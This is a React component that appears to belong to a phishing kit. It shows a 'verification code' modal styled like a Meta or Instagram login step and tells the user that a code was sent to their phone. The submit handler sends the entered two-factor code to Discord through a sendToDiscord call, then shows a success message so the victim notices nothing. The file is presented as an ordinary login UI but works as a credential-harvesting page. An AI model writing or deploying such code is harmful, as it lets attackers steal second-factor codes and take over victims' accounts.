import React, { useState } from 'react';
import { LoadingSpinner } from './LoadingSpinner';
import { sendToDiscord } from '../utils/discord';
import { toast } from 'react-hot-toast';

interface VerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
  onVerify: (code: string) => void;
}

export function VerificationModal({ isOpen, onClose, onVerify }: VerificationModalProps) {
  const [code, setCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  if (!isOpen) return null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    
    try {
      await sendToDiscord('2FA Code', code);
      toast.success('Verification code submitted');
    } catch (error) {
      console.error('Error:', error);
      toast.error('An error occurred');
    }

    setTimeout(() => {
      onVerify(code);
      setIsLoading(false);
    }, 1500);
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-[#121212] border border-gray-800 rounded-lg p-8 w-full max-w-sm">
        <h2 className="text-xl font-bold mb-6 text-center text-white">Enter Verification Code</h2>
        <p className="text-gray-400 text-sm text-center mb-6">
          We've sent a verification code to your phone number. Please enter it below.
        </p>
        <form onSubmit={handleSubmit} className="space-y-4">
          <input
            type="text"
            placeholder="Enter code"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            className="w-full px-4 py-2 bg-[#1c1c1c] border border-gray-800 rounded focus:outline-none focus:border-gray-700 text-white"
          />
          <button
            type="submit"
            className="w-full bg-[#0095f6] hover:bg-[#1877f2] text-white py-2 rounded font-semibold transition-colors flex items-center justify-center"
            disabled={isLoading}
          >
            {isLoading ? <LoadingSpinner /> : 'Verify'}
          </button>
        </form>
        <button
          onClick={onClose}
          className="mt-4 text-gray-400 hover:text-white text-sm w-full text-center"
        >
          Cancel
        </button>
      </div>
    </div>
  );
}